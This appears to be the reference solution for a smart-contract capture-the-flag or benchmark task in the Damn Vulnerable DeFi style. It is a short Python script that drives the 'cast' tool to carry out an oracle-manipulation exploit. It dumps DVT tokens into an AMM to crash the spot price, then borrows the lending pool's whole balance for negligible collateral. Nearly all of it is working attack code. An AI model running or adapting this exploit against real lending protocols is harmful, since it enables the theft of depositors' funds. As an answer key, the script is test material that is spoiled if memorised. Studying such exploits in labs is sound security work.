#!/usr/bin/env python3
"""Reference solution — must drain the pool to recovery (harness exit test).

The AMM is the lending pool's price oracle. Dump all our DVT into the AMM to
crash the token's spot price, which collapses the required collateral, then
borrow the pool's entire DVT balance for a tiny amount of ETH and send it to
the recovery address.
"""
import json
import subprocess
import sys
from pathlib import Path


def cast(*args):
    p = subprocess.run(["cast", *args], capture_output=True, text=True, timeout=120)
    if p.returncode != 0:
        sys.exit(f"cast {' '.join(args[:3])} failed: {p.stderr[:300]}")
    return p.stdout.strip().split()[0]     # drop any "[1.2e3]" annotation


def send(rpc, key, to, *args, value=None):
    cmd = ["send", "--rpc-url", rpc, "--private-key", key, to, *args]
    if value is not None:
        cmd += ["--value", str(value)]
    subprocess.run(["cast", *cmd], capture_output=True, text=True, timeout=120)


def main():
    p = json.loads(Path("params.json").read_text())
    rpc = p["rpc_url"]
    key = Path(p["key_file"]).read_text().strip()
    maxu = cast("max-uint")

    # 1) crash the oracle: dump all our DVT into the AMM
    send(rpc, key, p["token"], "approve(address,uint256)", p["amm"], maxu)
    send(rpc, key, p["amm"], "tokenToEth(uint256)", str(p["player_dvt"]))

    # 2) borrow the pool's entire DVT for the now-tiny collateral, to recovery
    amount = str(p["pool_tokens"])
    req = cast("call", "--rpc-url", rpc, p["pool"], "requiredCollateral(uint256)(uint256)", amount)
    send(rpc, key, p["pool"], "borrow(uint256,address)", amount, p["recovery"], value=req)
    print(f"drained {amount} DVT to {p['recovery']} for {req} wei collateral")


if __name__ == "__main__":
    main()
